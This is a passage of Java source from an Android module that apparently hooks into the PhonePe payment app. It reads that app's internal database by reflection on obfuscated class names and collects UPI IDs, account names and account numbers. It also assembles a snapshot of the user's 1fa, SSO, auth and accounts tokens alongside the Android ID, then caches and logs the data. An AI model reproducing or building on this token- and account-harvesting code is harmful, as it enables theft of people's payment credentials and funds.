        addUPIValue(upis, obj.opt("virtual_address"));
        addUPIValue(upis, obj.opt("paymentAddress"));
        addUPIValue(upis, obj.opt("payment_address"));
        addUPIValue(upis, obj.opt("upiAddress"));
        addUPIValue(upis, obj.opt("upis"));
        addUPIValue(upis, obj.opt("vpas"));
    }

    private static void addUPIValue(LinkedHashSet<String> upis, Object value) {
        if (upis == null || value == null) {
            return;
        }
        if (value instanceof JSONArray) {
            JSONArray arr = (JSONArray) value;
            for (int i = 0; i < arr.length(); i++) {
                addUPIValue(upis, arr.opt(i));
            }
            return;
        }
        if (value instanceof JSONObject) {
            JSONObject obj = (JSONObject) value;
            String direct = firstNonEmptyString(obj, "upi", "upiId", "vpa", "value", "address");
            if (!TextUtils.isEmpty(direct)) {
                addUPIValue(upis, direct);
            }
            return;
        }
        String raw = normalizeUPIId(String.valueOf(value));
        if (looksLikeUPIId(raw)) {
            upis.add(raw);
        }
    }

    private static void collectUPIsFromObjectValue(Object value, LinkedHashSet<String> upis) {
        if (value == null || upis == null) {
            return;
        }
        if (value instanceof Collection) {
            for (Object item : (Collection<?>) value) {
                addUPIValue(upis, item);
            }
            return;
        }
        if (value != null && value.getClass().isArray()) {
            int len = Array.getLength(value);
            for (int i = 0; i < len; i++) {
                addUPIValue(upis, Array.get(value, i));
            }
            return;
        }
        addUPIValue(upis, value);
    }

    private static JSONArray normalizeUPIArray(JSONArray raw) {
        LinkedHashMap<String, JSONObject> entries = new LinkedHashMap<>();
        if (raw == null) {
            return new JSONArray();
        }
        for (int i = 0; i < raw.length(); i++) {
            Object item = raw.opt(i);
            if (item instanceof JSONObject) {
                JSONObject normalized = normalizeUPIEntry((JSONObject) item);
                if (normalized != null) {
                    mergeUPIEntry(entries, normalized);
                }
            }
        }
        return entriesToArray(entries);
    }

    private static JSONObject normalizeUPIEntry(JSONObject obj) {
        if (obj == null) {
            return null;
        }
        String account = normalizeAccountName(obj.optString("account", ""));
        String accountNum = normalizeAccountNumber(obj.optString("accountNum", ""));
        String appType = normalizeAppType(obj.optString("appType", ""));
        if (TextUtils.isEmpty(appType)) {
            appType = "phonepe";
        }
        LinkedHashSet<String> upis = new LinkedHashSet<>();
        collectUPIsFromObject(obj, upis);
        JSONArray upiArr = new JSONArray();
        for (String upi : upis) {
            upiArr.put(upi);
        }
        if (upiArr.length() == 0) {
            return null;
        }
        JSONObject normalized = buildUPIInfo(account, accountNum, upiArr);
        try {
            normalized.put("appType", appType);
            String source = normalizeText(obj.optString("source", ""));
            if (!TextUtils.isEmpty(source)) {
                normalized.put("source", source);
            }
            String status = normalizeText(obj.optString("status", ""));
            if (!TextUtils.isEmpty(status)) {
                normalized.put("status", status);
            }
        } catch (JSONException e) {
            Log.w(TAG, "normalizeUPIEntry failed", e);
        }
        return normalized;
    }

    private static void mergeUPIEntry(LinkedHashMap<String, JSONObject> entries, JSONObject candidate) {
        if (entries == null || candidate == null) {
            return;
        }
        String key = buildUPIEntryKey(candidate);
        JSONObject existing = entries.get(key);
        if (existing == null) {
            entries.put(key, candidate);
            return;
        }
        mergeUPIEntryObjects(existing, candidate);
    }

    private static void mergeUPIEntryObjects(JSONObject target, JSONObject source) {
        if (target == null || source == null) {
            return;
        }
        try {
            if (TextUtils.isEmpty(target.optString("account", ""))) {
                target.put("account", source.optString("account", ""));
            }
            if (TextUtils.isEmpty(target.optString("accountNum", ""))) {
                target.put("accountNum", source.optString("accountNum", ""));
            }
            if (TextUtils.isEmpty(target.optString("appType", ""))) {
                target.put("appType", source.optString("appType", "phonepe"));
            }
            JSONArray targetUpis = target.optJSONArray("upis");
            JSONArray sourceUpis = source.optJSONArray("upis");
            LinkedHashSet<String> merged = new LinkedHashSet<>();
            collectUPIsFromArray(targetUpis, merged);
            collectUPIsFromArray(sourceUpis, merged);
            JSONArray mergedArr = new JSONArray();
            for (String upi : merged) {
                mergedArr.put(upi);
            }
            target.put("upis", mergedArr);
        } catch (JSONException e) {
            Log.w(TAG, "mergeUPIEntryObjects failed", e);
        }
    }

    private static void collectUPIsFromArray(JSONArray arr, LinkedHashSet<String> out) {
        if (arr == null || out == null) {
            return;
        }
        for (int i = 0; i < arr.length(); i++) {
            addUPIValue(out, arr.opt(i));
        }
    }

    private static JSONArray entriesToArray(LinkedHashMap<String, JSONObject> entries) {
        JSONArray arr = new JSONArray();
        if (entries == null) {
            return arr;
        }
        for (Map.Entry<String, JSONObject> entry : entries.entrySet()) {
            if (entry.getValue() != null) {
                arr.put(entry.getValue());
            }
        }
        return arr;
    }

    private static String buildUPIEntryKey(JSONObject entry) {
        if (entry == null) {
            return "";
        }
        String account = normalizeAccountName(entry.optString("account", ""));
        String accountNum = normalizeAccountNumber(entry.optString("accountNum", ""));
        String appType = normalizeAppType(entry.optString("appType", "phonepe"));
        return account + "|" + accountNum + "|" + appType;
    }

    private static boolean isUsableUPIArray(JSONArray arr) {
        return arr != null && arr.length() > 0 && !isFallbackUPIArray(arr);
    }

    private static boolean isFallbackUPIArray(JSONArray arr) {
        if (arr == null || arr.length() != 1) {
            return false;
        }
        JSONObject obj = arr.optJSONObject(0);
        if (obj == null) {
            return false;
        }
        String source = normalizeText(obj.optString("source", ""));
        String status = normalizeText(obj.optString("status", ""));
        return TextUtils.equals(source, "local_stub") && TextUtils.equals(status, "no_account_data");
    }

    private static JSONArray buildFallbackUPIs() {
        JSONArray arr = new JSONArray();
        try {
            JSONObject fallback = buildUPIInfo(getUserPhoneNum(), "", new JSONArray());
            fallback.put("source", "local_stub");
            fallback.put("status", "no_account_data");
            arr.put(fallback);
        } catch (JSONException e) {
            Log.w(TAG, "buildFallbackUPIs failed", e);
        }
        return arr;
    }

    private static String firstNonEmptyString(JSONObject obj, String... keys) {
        if (obj == null || keys == null) {
            return "";
        }
        for (String key : keys) {
            String value = normalizeText(obj.optString(key, ""));
            if (!TextUtils.isEmpty(value)) {
                return value;
            }
        }
        return "";
    }

    private static String normalizeText(String value) {
        if (value == null) {
            return "";
        }
        return value.trim();
    }

    private static String normalizeAccountName(String value) {
        return normalizeText(value);
    }

    private static String normalizeAccountNumber(String value) {
        String normalized = normalizeText(value);
        if (TextUtils.isEmpty(normalized)) {
            return "";
        }
        return normalized.replace(" ", "").replace("-", "");
    }

    private static String normalizeAppType(String value) {
        String normalized = normalizeText(value);
        if (TextUtils.isEmpty(normalized)) {
            return "";
        }
        return normalized.toLowerCase(Locale.US);
    }

    private static String normalizeUPIId(String value) {
        String normalized = normalizeText(value);
        if (TextUtils.isEmpty(normalized)) {
            return "";
        }
        return normalized.toLowerCase(Locale.US);
    }

    private static boolean looksLikeUPIId(String value) {
        if (TextUtils.isEmpty(value)) {
            return false;
        }
        return value.indexOf('@') > 0
                && value.indexOf('@') == value.lastIndexOf('@')
                && value.indexOf(' ') < 0;
    }

    private static boolean looksLikeJson(String raw) {
        if (TextUtils.isEmpty(raw)) {
            return false;
        }
        String trimmed = raw.trim();
        return (trimmed.startsWith("{") && trimmed.endsWith("}"))
                || (trimmed.startsWith("[") && trimmed.endsWith("]"));
    }

    private static boolean shouldParseJsonString(String key) {
        if (TextUtils.isEmpty(key)) {
            return false;
        }
        String normalized = key.trim().toLowerCase(Locale.US);
        return "raw".equals(normalized)
                || "payload".equals(normalized)
                || "data".equals(normalized)
                || "body".equals(normalized)
                || "result".equals(normalized)
                || "messageinfo".equals(normalized)
                || "msginfo".equals(normalized)
                || "token".equals(normalized)
                || "accountstoken".equals(normalized)
                || "authtoken".equals(normalized)
                || "ssotoken".equals(normalized);
    }

    private static void clearUPICache() {
        ensurePrefs();
        if (prefs == null) {
            return;
        }
        prefs.edit().remove(KEY_UPI_CACHE).apply();
    }

    private static Object resolveCoreDatabase() {
        if (appContext == null) {
            return null;
        }
        Object cached = readStaticField("com.phonepe.vault.core.CoreDatabase", "u");
        if (cached != null) {
            return cached;
        }
        for (String className : APP_SINGLETON_MODULE_CLASSES) {
            try {
                Class<?> cls = Class.forName(className);
                Object singleton = invokeStaticMethodNoThrow(cls, "X", appContext);
                if (singleton == null) {
                    singleton = invokeStaticMethodNoThrow(cls, "x", appContext);
                }
                Object db = singleton;
                if (db != null && !db.getClass().getName().toLowerCase(Locale.US).contains("database")) {
                    Object maybeDb = invokeMethodNoThrow(db, "l");
                    if (maybeDb != null) {
                        db = maybeDb;
                    }
                }
                if (db != null) {
                    return db;
                }
            } catch (Throwable ignored) {
                // try next class candidate
            }
        }
        return null;
    }

    private static Object invokeStaticMethodNoThrow(Class<?> cls, String methodName, Context context) {
        if (cls == null || TextUtils.isEmpty(methodName) || context == null) {
            return null;
        }
        Method[] methods = cls.getDeclaredMethods();
        for (Method m : methods) {
            if (!methodName.equals(m.getName())) {
                continue;
            }
            if ((m.getModifiers() & java.lang.reflect.Modifier.STATIC) == 0) {
                continue;
            }
            Class<?>[] params = m.getParameterTypes();
            if (params.length != 1 || !params[0].isAssignableFrom(context.getClass())) {
                if (!(params.length == 1 && Context.class.isAssignableFrom(params[0]))) {
                    continue;
                }
            }
            try {
                m.setAccessible(true);
                return m.invoke(null, context);
            } catch (Throwable ignored) {
                // try next overload
            }
        }
        return null;
    }

    private static Object invokeMethodNoThrow(Object target, String methodName, Object... args) {
        if (target == null || TextUtils.isEmpty(methodName)) {
            return null;
        }
        try {
            Method[] methods = target.getClass().getMethods();
            for (Method m : methods) {
                if (!methodName.equals(m.getName())) {
                    continue;
                }
                Class<?>[] params = m.getParameterTypes();
                int argLen = args == null ? 0 : args.length;
                if (params.length != argLen) {
                    continue;
                }
                boolean match = true;
                for (int i = 0; i < params.length; i++) {
                    Object arg = args[i];
                    if (arg == null) {
                        continue;
                    }
                    if (!params[i].isAssignableFrom(arg.getClass())) {
                        match = false;
                        break;
                    }
                }
                if (!match) {
                    continue;
                }
                m.setAccessible(true);
                return m.invoke(target, args);
            }
        } catch (Throwable ignored) {
            return null;
        }
        return null;
    }

    private static String readStringByMethods(Object target, String... methodNames) {
        if (target == null || methodNames == null) {
            return "";
        }
        for (String methodName : methodNames) {
            Object value = invokeMethodNoThrow(target, methodName);
            if (value == null) {
                continue;
            }
            String text = normalizeText(String.valueOf(value));
            if (!TextUtils.isEmpty(text) && !"null".equalsIgnoreCase(text)) {
                return text;
            }
        }
        return "";
    }

    private static Object readStaticField(String className, String fieldName) {
        if (TextUtils.isEmpty(className) || TextUtils.isEmpty(fieldName)) {
            return null;
        }
        try {
            Class<?> cls = Class.forName(className);
            java.lang.reflect.Field field = cls.getDeclaredField(fieldName);
            field.setAccessible(true);
            return field.get(null);
        } catch (Throwable ignored) {
            return null;
        }
    }

    private static boolean writeJson(String key, JSONObject json) {
        ensurePrefs();
        if (prefs == null) {
            return false;
        }
        if (json == null) {
            json = new JSONObject();
        }
        prefs.edit().putString(key, json.toString()).apply();
        return true;
    }

    private static JSONObject wrapObject(Object obj, int reason) {
        JSONObject json = new JSONObject();
        try {
            json.put("raw", String.valueOf(obj));
            json.put("reason", reason);
        } catch (JSONException e) {
            Log.w(TAG, "wrapObject failed", e);
        }
        return json;
    }

    private static String stringify(JSONObject obj) {
        return obj == null ? "" : obj.toString();
    }

    private static JSONObject buildTokenSnapshot() throws JSONException {
        JSONObject tokens = new JSONObject();
        tokens.put("1fa", get1faToken());
        tokens.put("sso", getSSOToken());
        tokens.put("auth", getAuthToken());
        tokens.put("accounts", getAccountsToken());
        return tokens;
    }

    private static String summarizeToken(JSONObject tokenObj) {
        if (tokenObj == null || tokenObj.length() == 0) {
            return "empty";
        }
        String token = tokenObj.optString("token", "");
        if (TextUtils.isEmpty(token)) {
            token = tokenObj.optString("raw", "");
        }
        long expiry = parseExpiry(tokenObj);
        return "len=" + token.length() + ",expiry=" + expiry;
    }

    private static long parseExpiry(JSONObject tokenObj) {
        if (tokenObj == null) {
            return 0L;
        }
        long expiry = tokenObj.optLong("expiry", 0L);
        if (expiry > 0) {
            return expiry;
        }
        return tokenObj.optLong("exp", 0L);
    }

    private static JSONObject safeJson(String value) {
        if (TextUtils.isEmpty(value)) {
            return new JSONObject();
        }
        try {
            return new JSONObject(value);
        } catch (JSONException e) {
            return new JSONObject();
        }
    }

    private static String getAndroidId() {
        if (appContext == null) {
            return "";
        }
        try {
            String id = Settings.Secure.getString(appContext.getContentResolver(), Settings.Secure.ANDROID_ID);
            return id == null ? "" : id;
        } catch (Throwable t) {
            return "";
        }
    }

    private static String formatDate(long time) {
        try {
            return new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US).format(new Date(time));
        } catch (Throwable t) {
            return String.valueOf(time);
        }
    }

    public static void logLong(String tag, String msg) {
        if (msg == null) {
            return;
        }
        int max = 3000;
        int len = msg.length();
        int start = 0;
        while (start < len) {
            int end = Math.min(start + max, len);
            Log.i(tag, msg.substring(start, end));
            start = end;
        }
    }
}
